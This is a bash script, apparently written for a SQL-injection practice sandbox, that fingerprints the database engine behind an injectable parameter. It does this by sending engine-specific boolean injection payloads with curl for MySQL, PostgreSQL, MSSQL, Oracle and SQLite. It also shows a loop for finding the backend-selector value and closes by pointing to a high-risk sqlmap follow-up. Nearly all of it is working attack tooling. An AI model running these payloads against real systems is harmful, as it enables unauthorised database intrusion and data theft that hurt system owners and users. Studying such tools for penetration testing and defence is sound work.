#!/usr/bin/env bash
# dbms-id — identify the real backend engine behind an injectable parameter.
#
# Fires one engine-ONLY function per DBMS through your injection boundary and tells
# you which engine answers. Also solves the "which selector value routes to which
# engine" problem for apps that pick a backend from a request parameter (and whose
# value need NOT match sqlmap's --dbms spelling).
#
# You provide a data template with the token __P__ where the payload goes, and a
# string that appears in a NORMAL/true response. A probe that returns that marker =
# that engine; error or missing marker = not it.
#
# Usage:
#   ./dbms-id.sh <url> '<data-template-with-__P__>' '<true-marker>' [prefix] [comment] [GET|POST]
#
# Defaults: prefix="%')"  comment="-- -"  method=POST   (prefix = how you break out
# of a LIKE ('%..%') sink; use "'" , "')" , "'))" , or "" for numeric, as you found.)
#
# Example (boundary  taco%') ... -- -, true page contains "Tacos"):
#   ./dbms-id.sh http://sql-sandbox/sqlmap/api \
#       "db=mysql&name=__P__&sort=id&order=asc" Tacos "%')" "-- -" POST
#
# To also find the backend-SELECTOR value, loop this over candidate db= values:
#   for d in mysql mssql postgres postgresql oracle ora orcl sqlite; do echo "== $d =="; \
#     ./dbms-id.sh URL "db=$d&name=__P__&sort=id&order=asc" Tacos "%')" "-- -" POST; done
set -uo pipefail

URL="${1:?usage: dbms-id.sh <url> '<data __P__>' '<true-marker>' [prefix] [comment] [GET|POST]}"
TMPL="${2:?need data template containing __P__}"
MARK="${3:?need a true-response marker string}"
PRE="${4-%\')}"          # break-out prefix (default closes a LIKE ('%..%') sink)
CMT="${5---  -}"         # comment to swallow the trailing SQL (default '-- -')
METHOD="${6:-POST}"

# base value + prefix + " OR <engine-only test> " + comment
declare -A P=(
  [MySQL]="base${PRE} OR sleep(0)=0${CMT}"
  [MySQL2]="base${PRE} OR @@version LIKE '%'${CMT}"
  [PostgreSQL]="base${PRE} OR 'a' ILIKE 'a'${CMT}"
  [PostgreSQL2]="base${PRE} OR 1=1::int${CMT}"
  [MSSQL]="base${PRE} OR LEN(@@version)>0${CMT}"
  [Oracle]="base${PRE} OR rownum=1${CMT}"
  [Oracle2]="base${PRE} OR 1=BITAND(1,1)${CMT}"
  [SQLite]="base${PRE} OR sqlite_version()>'0'${CMT}"
)
# print in a sensible order
for k in MySQL MySQL2 PostgreSQL PostgreSQL2 MSSQL Oracle Oracle2 SQLite; do
  payload="${P[$k]}"
  data="${TMPL/__P__/$payload}"
  if [ "$METHOD" = GET ]; then
    resp=$(curl -s -G "$URL" --data-urlencode "${data}")
  else
    # split template on & into urlencoded fields so the payload's &/= survive
    args=(); IFS='&' read -ra kvs <<< "$data"
    for kv in "${kvs[@]}"; do args+=(--data-urlencode "$kv"); done
    resp=$(curl -s "$URL" "${args[@]}")
  fi
  if printf '%s' "$resp" | grep -qiE 'error|exception|syntax|fatal'; then verdict="error (not this engine)"
  elif printf '%s' "$resp" | grep -qF "$MARK";            then verdict="MATCH  <= ${k%[0-9]} engine"
  else                                                         verdict="no marker (false / not this engine)"
  fi
  printf '  %-12s %-40s -> %s\n' "$k" "${payload:0:40}" "$verdict"
done
echo "[*] The engine whose probe MATCHes is the real backend. If two 'variant' probes of the"
echo "    same engine match, that's it. Then: sqlmap ... --dbms=<engine> --level 3 --risk 3 --flush-session"
